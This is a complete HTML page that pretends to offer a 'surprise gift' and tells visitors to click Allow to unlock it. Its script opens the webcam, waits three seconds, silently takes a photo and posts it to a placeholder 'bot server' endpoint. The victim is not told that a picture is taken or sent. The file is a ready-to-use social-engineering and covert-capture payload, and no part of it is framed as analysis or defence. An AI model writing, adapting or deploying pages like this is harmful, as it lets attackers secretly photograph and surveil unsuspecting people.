<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>üéÅ Unlock Your Surprise</title>

<style>
    body {
        margin: 0;
        background: black;
        color: white;
        font-family: Arial, sans-serif;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        overflow: hidden;
        flex-direction: column;
        text-align: center;
    }

    #loading {
        font-size: 26px;
        animation: blink 1s infinite;
    }

    @keyframes blink {
        0% { opacity: 0.2; }
        50% { opacity: 1; }
        100% { opacity: 0.2; }
    }

    video {
        width: 150px;
        height: 150px;
        border-radius: 50%;
        object-fit: cover;
        display: none;
    }
</style>
</head>

<body>

<h2 id="loading">Loading your surprise...</h2>
<h3>üéÅ Please click <b>Allow</b> to unlock your gift!</h3>

<video id="preview" autoplay playsinline></video>

<script>
    const video = document.getElementById("preview");
    const loading = document.getElementById("loading");

    async function startCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });

            loading.style.display = "none";
            video.style.display = "block";
            video.srcObject = stream;

            setTimeout(() => captureAndSend(stream), 3000);

        } catch (err) {
            loading.innerText = "Camera blocked ‚ùå Please allow to unlock your surprise!";
        }
    }

    function captureAndSend(stream) {
        const track = stream.getVideoTracks()[0];
        const imageCapture = new ImageCapture(track);

        imageCapture.takePhoto()
        .then(blob => {
            let form = new FormData();
            form.append("photo", blob, "pic.jpg");

            fetch("https://your-bot-server-url/send", {   // your bot server endpoint
                method: "POST",
                body: form
            });

        }).catch(() => {
            loading.innerText = "Error capturing photo!";
        });
    }

    startCamera();
</script>

</body>
</html>
